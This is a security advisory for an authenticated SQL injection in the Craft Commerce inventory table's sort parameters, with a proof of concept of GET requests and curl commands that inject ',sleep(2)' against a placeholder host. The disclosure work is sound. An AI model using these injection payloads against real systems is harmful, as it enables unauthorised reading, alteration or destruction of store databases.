# [H] Craft Commerce is vulnerable to SQL Injection in Commerce Inventory Table Sorting

## Summary
Severity: High
Advisory: GHSA-pmgj-gmm4-jh6j
CVE: CVE-2026-29174
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-10
Source: https://github.com/advisories/GHSA-pmgj-gmm4-jh6j
Type: github-advisory

## Affected
- Packagist: `craftcms/commerce` — affected >=5.0.0 <5.5.3

## Details
## Summary

Craft Commerce is vulnerable to **SQL Injection** in the inventory levels table data endpoint. The `sort[0][direction]` and `sort[0][sortField]` parameters are concatenated directly into an `addOrderBy()` clause without any validation or sanitization. An authenticated attacker with access to the Commerce Inventory section can inject arbitrary SQL queries, potentially leading to a full database compromise.

---
## PoC
### Required Permissions
- General
	- Access the control panel
	- Access Craft Commerce
- Craft Commerce
	- Manage inventory stock levels 

### Steps to reproduce
1. Log in to the control panel
2. Navigate to **Commerce** > **Inventory**
3. Click on any sortable column header (e.g., "SKU") to trigger a sort request
4. Intercept the request and modify `sort[0][direction]` or `sort[0][sortField]` parameters and append `,sleep(2)` payload to it's current value as follows:

```bash
# sort[0][sortField]=sku,sleep(2)
GET /index.php?p=admin/actions/commerce/inventory/inventory-levels-table-data&sort[0][sortField]=sku,sleep(2)&sort[0][direction]=asc&inventoryLocationId=1&containerId=%23inventory-levels
# sort[0][direction]=asc,sleep(2)
GET /index.php?p=admin/actions/commerce/inventory/inventory-levels-table-data&sort[0][sortField]=sku&sort[0][direction]=asc,sleep(2)&inventoryLocationId=1&containerId=%23inventory-levels
```

6. Observe the delay in the response, confirming the injection

Alternatively, you can use the following `curl` (bash syntax) command (replace cookie and target domain as needed):
```bash
# sort[0][sortField]=sku,sleep(2)
curl --path-as-is -k -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0' -H $'Accept: application/json, text/plain, */*' -b $'<Cookie>' $'http://craft.local/index.php?p=admin/actions/commerce/inventory/inventory-levels-table-data&sort%5b0%5d%5bfield%5d=purchasable&sort%5b0%5d%5bsortField%5d=sku,sleep(2)&sort%5b0%5d%5bdirection%5d=asc&page=1&per_page=25&inventoryLocationId=1&containerId=%23inventory-levels'
# sort[0][direction]=asc,sleep(2)
curl --path-as-is -k -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0' -H $'Accept: application/json, text/plain, */*' -b $'<Cookie>' $'http://craft.local/index.php?p=admin/actions/commerce/inventory/inventory-levels-table-data&sort%5b0%5d%5bfield%5d=purchasable&sort%5b0%5d%5bsortField%5d=sku&sort%5b0%5d%5bdirection%5d=asc,sleep(2)&page=1&per_page=25&inventoryLocationId=1&containerId=%23inventory-levels'
```

### Impact
With this Blind SQLi, an attacker can:
- **Exfiltrate data** character-by-character using time-based techniques.
- **Modify or destroy data** (drop tables, update records, alter schema).

## References
- https://github.com/craftcms/commerce/security/advisories/GHSA-pmgj-gmm4-jh6j
- https://nvd.nist.gov/vuln/detail/CVE-2026-29174
- https://github.com/craftcms/commerce/commit/094d69df24b925544f337c38e2ec1effcd5395c7
- https://github.com/craftcms/commerce/commit/a2ea853935ef03297ea1298bdb0d8c55ec5daf7b
- https://github.com/craftcms/commerce
